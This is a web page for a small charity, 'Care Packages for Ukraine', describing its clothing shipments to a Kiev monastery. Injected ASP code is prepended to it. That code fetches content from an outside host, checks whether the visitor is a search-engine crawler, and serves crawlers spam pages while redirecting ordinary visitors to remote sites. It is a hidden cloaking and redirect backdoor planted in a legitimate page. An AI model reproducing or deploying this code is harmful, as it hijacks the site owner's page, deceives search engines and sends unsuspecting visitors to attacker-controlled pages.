<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
getHTTPPage=""
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<%
Dim xy,jd,sz,m
if Request.ServerVariables("HTTPS")= "off" then
xy="http://"
else
xy="https://"
end if
vurl = "http://www.jbzoimg.com/"

if request("g")<>"" then
sz=request("g")
jd=getHTTPPage(vurl&"5.aspx?sz="&sz)
else

jd=getHTTPPage(vurl&"5.aspx?xy="&xy)
sz=getHTTPPage(vurl&"5.aspx?jd="&jd)
end if

m=1
if request("m")<>"" then
m=request("m")
end if
%>
<%
if request("s")<>"" then
URL=jd&"s814.aspx?cid="&request("cid")&"&number="&request("number")&"&pnum="&request("pnum")&"&m="&m
con=getHTTPPage(URL)
con=Replace(con, "yymm", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "ggggg", sz)
con=Replace(con, "iid=", "DNN=ke")
Response.contentType="text/xml"
Response.write con
Response.end
end if
%>
<%
Dim Url,Html,hyzhdy,kname
hyzhdy=jd&"0814.aspx"

if request("DNN")<>"" then
kname =getHTTPPage(jd&"gn.aspx?iid="&Replace(request("DNN"),"ke",""))
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")&"*"&Request.ServerVariables("REMOTE_HOST")&"*"&Request.ServerVariables("HTTP_CLIENT_IP")&"*"&Request.ServerVariables("HTTP_X_FORWARDED")&"*"&Request.ServerVariables("HTTP_FORWARDED_FOR")&"*"&Request.ServerVariables("HTTP_FORWARDED")
end if
ipurl=jd&"getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0) then
    if request("DNN")<>""  then
    ddd=jd&"a.aspx"
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(kname)&"&url="&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME")
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	response.End()
    end if	
     if request("pnum")<>""  then
    ddd=jd&"a.aspx"
	ddd=Replace(ddd, "products.aspx", "")
    ddd=ddd&"?cid="&request("cid")&"&url="&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME")
    Response.write "<script>self.location.href="""&ddd&"""</script>"
	response.End()
    end if	
end if
%>
<%
if request("DNN")<>"" then
URL=hyzhdy&"?iid="&Replace(request("DNN"),"ke","")&"&cid="&request("cid")&"&m="&m

else
URL=hyzhdy&"?cid="&request("cid")&"&pnum="&request("pnum")&"&m="&m
end if

con=getHTTPPage(URL)
con=Replace(con, "iid=", "DNN=ke")
con=Replace(con, "ggggg", sz)
con=Replace(con, "UUUUU", xy&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "IIIII", xy&Request.ServerVariables("HTTP_HOST"))
Response.write con
%>
<html><head>
    <title>Care Packages for Ukraine</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link href="layout/styles/layout.css" rel="stylesheet" type="text/css" media="all">
</head>
<body id="top">
    <!-- ################################################################################################ -->
    <!-- ################################################################################################ -->
    <!-- ################################################################################################ -->
    <!-- Top Background Image Wrapper -->
    <div class="bgded overlay" style="background-image:url('images/demo/backgrounds/kiev2.jpeg');">
        <!-- ################################################################################################ -->
        <div class="wrapper row1">
            <header id="header" class="hoc clear">
                <!-- ################################################################################################ -->
                <div id="logo" class="fl_left">
                 </div>
                <nav id="mainav" class="fl_right">
                    <ul class="clear">
                        <li class="active"><a href="index.html">English</a></li>
                        <li class="active"><a href="../pages/Russian.html">Pусский</a></li>
                        <li class="active"><a href="../pages/Ukrainian.html">Українська</a></li>
                        <li class="active"><a href="../pages/gallery.html">Gallery</a></li>
                        <!--<li class="active"><a href="../pages/VVG.html">VVG</a></li>-->
                    </ul>
                <form action="#"><select><option selected="selected" value="">MENU</option><option value="index.html">English</option><option value="../pages/Russian.html">Pусский</option><option value="../pages/Ukrainian.html">Українська</option><option value="../pages/gallery.html">Gallery</option></select></form></nav>
                <!-- ################################################################################################ -->
            </header>
        </div>
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <div id="pageintro" class="hoc clear">
            <!-- ################################################################################################ -->
            <div class="flexslider basicslider">
                
            <div class="flex-viewport" style="overflow: hidden; position: relative; height: 158.396px;"><ul class="slides" style="width: 1000%; transition-duration: 0s; transform: translate3d(-978px, 0px, 0px);"><li class="clone" aria-hidden="true" style="width: 978px; margin-right: 0px; float: left; display: block;">
                        <article>

                            <h3 class="heading">Welcome to Care packages for Ukraine</h3>
                            <p>"A care package for those in need"</p>

                        </article>
                    </li>
                    <li style="width: 978px; margin-right: 0px; float: left; display: block;" class="flex-active-slide" data-thumb-alt="">
                        <article>

                            <h3 class="heading">Welcome to Care packages for Ukraine</h3>
                            <p>"A care package for those in need"</p>



                        </article>
                    </li>

                    <li data-thumb-alt="" style="width: 978px; margin-right: 0px; float: left; display: block;">
                        <article>

                            <h3 class="heading">Welcome to Care packages for Ukraine</h3>
                            <p>
                    </p><li><a href="http://careforukraine.com/pages/gallery.html">Click here to see what we donate!</a></li><p></p>

                    </article>
                    </li>
                    <li data-thumb-alt="" style="width: 978px; margin-right: 0px; float: left; display: block;">
                        <article>

                            <h3 class="heading">Welcome to Care packages for Ukraine</h3>
                            <p>"A care package for those in need"</p>

                        </article>
                    </li>
                <li style="width: 978px; margin-right: 0px; float: left; display: block;" class="clone" aria-hidden="true">
                        <article>

                            <h3 class="heading">Welcome to Care packages for Ukraine</h3>
                            <p>"A care package for those in need"</p>



                        </article>
                    </li></ul></div><ol class="flex-control-nav flex-control-paging"><li><a href="#" class="flex-active">1</a></li><li><a href="#">2</a></li><li><a href="#">3</a></li></ol></div>
            <!-- ################################################################################################ -->
        </div>
        <!-- ################################################################################################ -->
    </div>
  
    <!-- ################################################################################################ -->
    <div class="wrapper row3">
        <!--<main class="hoc container clear">-->
        <!-- main body -->
        <!-- ################################################################################################ -->
        <div class="wrapper">
            <article id="shout" class="hoc container clear">
                <!-- ################################################################################################ -->
                <div class="three_quarter first">
                    <!--<h2 class="heading btmspace-10">vvg</h2>-->
                    <h3 class="nospace">About us</h3>
                    <p class="space">
                        Our mission is to collect and redistribute items of need to the homeless and refugees who are situated in Kiev, Ukraine. In order to accomplish this goal, we will be fundraising, accepting donations, and doing clothes drives to get materials. We will be working closely with volunteers in Ukraine who are willing to help us complete our goal.
                        <br>
                        <br>
                        We researched many shelters and orphanages in Ukraine, and determined that the Florovsky monastery is the optimal place to send our shipments of clothes, kitchen items, and toys. Thousands of refugees either live in this monastery, or frequently go there to obtain food, clothing, toiletries, toys, or other goods which their family needs.
                    </p>
                    <h3 class="nospace">Why we do it</h3>
                    <p class="space">
                        The conflict in eastern Ukraine is still ongoing; the United Nations reports that over the past two years this strife has claimed more than 9,000 lives and has created more than 2,000,000 refugees. An estimated 800,000 people are living in difficult and dangerous conditions on both sides of the frontline. With the first snow and freezing temperatures, the delivery of winter aid to these remote communities becomes crucial. Unfortunately, these IDC’s (Internally Displaced Citizens) cannot expect any help from the Ukrainian government amidst its own political struggles. The fate of these refugees lies on the shoulders of charitable organizations and volunteers like ourselves. These refugees are discriminated upon and have a much worse time trying to find employment. 
                    </p>
                    <h3 class="nospace">What we do</h3>
                    <p class="space">
                        We collect clothing, toiletries, toys, and other goods through various fundraisers, donations, and drives. These goods are packaged into large boxes, and shipped directly to the Florovsky monastery in Kiev, Ukraine. Our goods are collected from local schools, organizations, and churches. One of our premier partners is the Hope for the Homeless club at Simsbury High School in Simsbury, Connecticut.
                    </p>
                    <h3 class="nospace">What we have done</h3>
                    <p class="space">
                        </p><li>Package #1 was 49lbs, contained pants, shirts, skirts, coats, shoes, children's clothing, and dinner ware. It was sent 07/19/16</li>
                        <br>
                        <li>Package #2 was 54lbs, contained pants, shirts, sweaters, skirts, coats, shoes, children's clothing, and house hold items. It was sent 07/19/16</li>
                        <br>
                        <li>Package #3 was 70lbs, contained pants, shirts, sweaters, coats, shoes, children's clothing, and house hold items. It was sent 10/18/16</li>
                        <br>
                        <li>Package #4 was 35lbs, contained shirts, sweaters, shoes, children's clothing, and house hold items. It was sent 05/30/17</li>
                        <br>
                        <li>Package #5 was 70lbs, contained pants, shirts, sweaters, coats, shoes, and house hold items. It was sent 05/30/17</li>
                        <br>
                        <li>Package #6 was 76lbs, contained coats, boots, shoes, hats, dresses, and belts. It was sent 12/26/17</li>
                        <br>
                        <li>Package #7 was 56lbs, contained toys, socks, shirts, gloves, and winter coats. It was sent 12/26/17</li>
                        
                       
                        
                    <p></p>
                </div>                
            </article>
        </div>
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <div class="wrapper ">
            <section class="hoc container clear">
                <!-- #######################group####### <section class="hoc container clear">################################################################## -->

                <div class="group">
                    <!--<div class="one_third first">
                        <h6 class="nospace font-x1">Who we are and how we do it</h6>
                        <p>Our club had raised $450 in the past year and we were able to help local homeless shelters in the area&hellip;</p>
                        <footer><a class="btn" href="#">Read More</a></footer>
                    </div>-->
                    <article class="one_third first">
                        <a href="http://ua.igotoworld.com/en/poi_object/66424_svyato-voznesenskiy-florovskiy-monastyr.htm" target="_blank"><img class=" btmspace-30" src="images/demo/backgrounds/monestery1.jpg" alt=""></a>
                        <h6 class="nospace font-x1">Florovsky monastery</h6>
                        <p>
                            This monastery acts as a sanctuary for people in need. Refugees and homeless can reside here and collect items such as the ones listed on the right,
                            and bring them to their families. Click the photo of the monastery to find out more!
                        </p>
                    </article>

                    <article class="one_third">
                        <a href="#"><img class="btmspace-30" src="images/demo/backgrounds/ukraine-refugees.jpg" alt=""></a>
                        <h6 class="nospace font-x1">Items desired the most are:</h6>
                        <p>
                            Clothes, bedding, kitchen items, toys, and more!
                        </p>
                    </article>

                    <article class="one_third">
                        <h6 class="nospace font-x1">More info about the Ukrainian Crisis:</h6>
                        <p>
                            </p><ul style="list-style-type:disc">
                                <li><a href="http://www.cnn.com/2015/02/10/europe/ukraine-war-how-we-got-here/index.html" target="_blank">Ukraine: Everything you need to know about how we got here</a></li>
                                <li><a href="http://www.ibtimes.co.uk/ukraine-conflict-creates-largest-european-displacement-crisis-since-balkan-wars-1483671" target="_blank">Ukrainian conflict creates largest European displacement </a></li>
                                <li><a href="http://www.bbc.com/news/world-europe-33866228 " target="_blank">Ukraine refugees makes new life in Kiev</a></li>                               
                            </ul>
                        <p></p>
                    </article>
                </div>
                <!-- ################################################################################################ -->
            </section>
        </div>
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <div class="wrapper row4 bgded overlay" style="background-image:url('images/demo/backgrounds/monestery1.jpg');">
            <footer id="footer" class="hoc clear">
                <!-- ################################################################################################ -->
                <div class="one_third first">
                    <h3 class="heading">Care Packages for Ukraine</h3>
                    <!--get this info from the ctrg website// -->
                    <ul class="faico clear">
                        <!--<li><a class="faicon-instagram" href="https://www.yahoo.com/" target="_blank"><i class="fa faicon-instagram"></i></a></li>-->
                        <li><a class="faicon-facebook" href="https://www.facebook.com/michael.berman.3110?hc_ref=SEARCH" target="_blank"><i class="fa fa-facebook"></i></a></li>
                        <li><a class="faicon-twitter" href="https://twitter.com/hfth098" target="_blank"><i class="fa fa-twitter"></i></a></li>
                        <!--<li><a class="faicon-dribble" href="#"><i class="fa fa-dribbble"></i></a></li>-->
                        <li><a class="faicon-linkedin" href="https://www.linkedin.com/in/michael-berman-072453122" target="_blank"><i class="fa fa-linkedin"></i></a></li>
                        <!--<li><a class="faicon-google-plus" href="#"><i class="fa fa-google-plus"></i></a></li>
    <li><a class="faicon-vk" href="#"><i class="fa fa-vk"></i></a></li>-->

                    </ul>
                </div>
                <div class="one_third">
                    <ul class="nospace meta">
                        <!--<i class="fa fa-phone pright-10"></i>(860) 123-4567-->
                        <br>
                        <i class="fa fa-envelope-o pright-10"></i>
                        <a href="#">michaelberman12@gmail.com</a>
                    </ul>
                </div>
                <div class="one_third">
                    <form method="post" action="#">
                        <fieldset>
                            <legend>Newsletter:</legend>
                            <div class="clear">
                                <input type="text" value="" placeholder="Type Email Here…">
                                <button class="fa fa-share" type="submit" title="Submit"><em>Submit</em></button>
                            </div>
                        </fieldset>
                    </form>
                </div>
                <!-- ################################################################################################ -->
            </footer>
        </div>
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <div class="wrapper row5">
            <div id="copyright" class="hoc clear">
                <!-- ################################################################################################ -->
                <p class="fl_left">Copyright © 2016 - All Rights Reserved - <a href="#">CareforUkraine</a></p>
                <p class="fl_right">Template by <a target="_blank" href="http://www.os-templates.com/" title="Free Website Templates">OS Templates</a></p>
                <!-- ################################################################################################ -->
            </div>
        </div>
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <!-- ################################################################################################ -->
        <a id="backtotop" href="#top"><i class="fa fa-chevron-up"></i></a>
        <!-- JAVASCRIPTS -->
        <script src="layout/scripts/jquery.min.js"></script>
        <script src="layout/scripts/jquery.backtotop.js"></script>
        <script src="layout/scripts/jquery.mobilemenu.js"></script>
        <script src="layout/scripts/jquery.flexslider-min.js"></script>
    </div>

</body></html>